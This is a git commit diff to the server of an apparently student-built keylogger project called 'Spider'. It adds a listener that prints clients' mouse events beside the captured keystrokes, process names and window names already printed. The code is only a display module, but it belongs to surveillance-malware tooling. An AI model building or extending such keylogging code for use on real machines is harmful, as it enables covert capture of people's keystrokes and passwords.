ab3b903590123b14c74b5f104553afd97dc4a8df
Hippolyte Barraud <hippolyte.barraud@epitech.eu>
2016-11-13 23:16:14 +0100

    Added mouse event to stdout

--- Server/BusinessModules/OutputSTDOUTModule.hpp
+++ Server/BusinessModules/OutputSTDOUTModule.hpp
@@ -13,21 +13,29 @@
 #include "../SpiderEventManager/SpiderEventEmitter.hpp"
 #include "../ProtoEnvelopes/Proto/SpiderKeyloggingPayload.pb.h"
 #include "../ProtoEnvelopes/Proto/test.pb.h"
+#include "../ProtoEnvelopes/Proto/SpiderMouseEvent.pb.h"
 
 class OutputSTDOUTModule : public ISpiderBusinessModule {
-    std::unique_ptr<ISpiderEventListener<SpiderKeyLoggingPayload>> _eventListener = std::unique_ptr<ISpiderEventListener<SpiderKeyLoggingPayload>>(new SpiderEventListener<SpiderKeyLoggingPayload>());
+    std::unique_ptr<ISpiderEventListener<SpiderKeyLoggingPayload>> _eventKeylogListener = std::unique_ptr<ISpiderEventListener<SpiderKeyLoggingPayload>>(new SpiderEventListener<SpiderKeyLoggingPayload>());
+    std::unique_ptr<ISpiderEventListener<SpiderMouseEvent>> _eventMouseListener = std::unique_ptr<ISpiderEventListener<SpiderMouseEvent>>(new SpiderEventListener<SpiderMouseEvent>());
     std::unique_ptr<ISpiderEventListener<testPayload>> _eventTestListener = std::unique_ptr<ISpiderEventListener<testPayload>>(new SpiderEventListener<testPayload>());
     std::unique_ptr<ISpiderEventEmitter> _eventEmitter = std::unique_ptr<ISpiderEventEmitter>(new SpiderEventEmitter());
 private:
 
 public:
     OutputSTDOUTModule() {
-        _eventListener->Register("SpiderKeyLoggingPayload", [&](std::string clientId, SpiderKeyLoggingPayload &payload) {
+        _eventKeylogListener->Register("SpiderKeyLoggingPayload", [&](std::string clientId, SpiderKeyLoggingPayload &payload) {
             std::cout << "[Keylogging from client with ID " << clientId << "]" << std::endl;
             if (payload.context().processname() != "" && payload.context().windowsname() != "")
                 std::cout << "From context : [Process : " << payload.context().processname() << "; Windows : " << payload.context().windowsname() <<"]" << std::endl;
             if (payload.plaintextkeylog() != "")
                 std::cout << "==> " << payload.plaintextkeylog() << std::endl;
+            std::cout << "---------------------------------------------------" << std::endl;
+        });
+
+        _eventMouseListener->Register("SpiderMouseEvent", [&](std::string clientId, SpiderMouseEvent &payload) {
+            std::cout << "[Mouse activity from client with ID " << clientId << "]" << std::endl;
+            std::cout << "[TYPE : " << payload.type() << "] " << "X : " << payload.x() << " Y : " << payload.y() << std::endl;
             std::cout << "---------------------------------------------------" << std::endl;
         });
 
